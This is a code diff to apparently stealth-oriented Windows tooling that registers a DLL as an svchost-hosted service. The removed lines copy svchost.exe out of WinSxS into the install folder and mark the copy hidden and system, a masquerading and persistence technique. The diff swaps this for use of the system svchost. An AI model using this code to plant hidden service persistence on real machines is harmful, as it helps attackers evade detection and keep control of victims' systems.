@@ -1334,17 +1334,8 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
 
     if (!Stealth_SelectSvchostImage(dllPath, hostExePath, _countof(hostExePath), &hostExeUsesExpand))
     {
-        // even if selection fails, hostExePath contains fallback
-    }
-
-    if (hostExePath[0] == 0)
-    {
-        if (!Stealth_GetSystemSvchostPathW(hostExePath, _countof(hostExePath)))
-        {
-            Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed to resolve system svchost.exe (error=%lu)", GetLastError());
-            return FALSE;
-        }
-        hostExeUsesExpand = FALSE;
+        Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed to resolve system svchost.exe (error=%lu)", GetLastError());
+        return FALSE;
     }
 
     _snwprintf_s(imagePathValue, _countof(imagePathValue), _TRUNCATE, L"%s -k %s -p", hostExePath, groupName);
@@ -1787,78 +1778,23 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 #endif // BUILD_SVCHOST_DLL
 static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand)
 {
-    WCHAR windowsDir[MAX_PATH] = {0};
-    WCHAR installDir[MAX_PATH] = {0};
+    UNREFERENCED_PARAMETER(dllPath);
 
-    if (exePathOut == NULL || exePathOutLen == 0) { return FALSE; }
+    if (exePathOut == NULL || exePathOutLen == 0)
+    {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
     exePathOut[0] = L'\0';
     if (useExpand != NULL) { *useExpand = FALSE; }
 
-    if (dllPath != NULL && dllPath[0] != 0)
-    {
-        lstrcpynW(installDir, dllPath, (int)_countof(installDir));
-        wchar_t *lastSlash = wcsrchr(installDir, L'\\');
-        if (lastSlash != NULL) { *lastSlash = L'\0'; }
-    }
-
-    if (GetWindowsDirectoryW(windowsDir, (DWORD)_countof(windowsDir)) > 0)
-    {
-        WCHAR pattern[MAX_PATH] = {0};
-        WIN32_FIND_DATAW findData;
-        HANDLE hFind = INVALID_HANDLE_VALUE;
-
-        _snwprintf_s(pattern, _countof(pattern), _TRUNCATE, L"%s\\WinSxS\\amd64_microsoft-windows-services-svchost_*", windowsDir);
-        hFind = FindFirstFileW(pattern, &findData);
-        if (hFind != INVALID_HANDLE_VALUE)
-        {
-            do
-            {
-                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
-                {
-                    WCHAR candidate[MAX_PATH] = {0};
-                    WCHAR target[MAX_PATH] = {0};
-
-                    _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\WinSxS\\%s\\svchost.exe", windowsDir, findData.cFileName);
-                    if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { continue; }
-
-                    if (installDir[0] != 0)
-                    {
-                        _snwprintf_s(target, _countof(target), _TRUNCATE, L"%s\\svchost.exe", installDir);
-                        SetFileAttributesW(target, FILE_ATTRIBUTE_NORMAL);
-                        DeleteFileW(target);
-                        if (CopyFileW(candidate, target, FALSE))
-                        {
-                            SetFileAttributesW(target, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-                            lstrcpynW(exePathOut, target, (int)exePathOutLen);
-                            FindClose(hFind);
-                            return TRUE;
-                        }
-                        else
-                        {
-                            DWORD err = GetLastError();
-                            fwprintf(stderr, L"[!] CopyFile failed: %s -> %s (error %lu)\n", candidate, target, err);
-                        }
-                    }
-                    else
-                    {
-                        lstrcpynW(exePathOut, candidate, (int)exePathOutLen);
-                        FindClose(hFind);
-                        return TRUE;
-                    }
-                }
-            } while (FindNextFileW(hFind, &findData));
-            FindClose(hFind);
-        }
-    }
-
-    // Fallback to the standard System32 host resolved by the OS.
     if (!Stealth_GetSystemSvchostPathW(exePathOut, exePathOutLen))
     {
         Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage failed to resolve system svchost.exe (error=%lu)", GetLastError());
         if (useExpand != NULL) { *useExpand = FALSE; }
         return FALSE;
     }
-    Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage fallback to %ls", exePathOut);
+    Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage resolved system svchost.exe: %ls", exePathOut);
     if (useExpand != NULL) { *useExpand = FALSE; }
     return TRUE;
 }
